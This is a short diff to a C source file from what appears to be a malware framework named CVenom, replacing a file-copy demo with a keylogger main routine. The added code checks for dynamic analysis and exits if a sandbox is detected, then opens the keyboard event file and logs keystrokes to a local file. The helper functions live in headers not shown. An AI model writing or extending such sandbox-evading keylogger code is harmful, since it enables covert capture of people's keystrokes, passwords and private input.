@@ -1,15 +1,17 @@
 #include "../CVenom.h"
-#include "../DiskTools.h"
-#include "../SystemTools.h"
-
+#include "../EvasionTools.h"
+#include "../KeyboardTools.h"
 int main(MALWARE_ENTRY){
 	cvinit(MALWARE_INIT);
+	KeyboardTools Keyboard;
+	EvasionTools Evador;
 
-	SystemTools		System;
-	DiskTools		Disk;
+	if(Evador.CheckDynamicAnalysis() > 0)
+		cvexit(MALWARE_EXIT);
 
-	Disk.FolderCopy("ayre", "zabre");
-	printf("%s\n", System.CUHome());
+	Keyboard.GetEventFile();
+	Keyboard.OutputTo("Ayre");
+	Keyboard.Run();
 
 	cvexit(MALWARE_EXIT);
 }
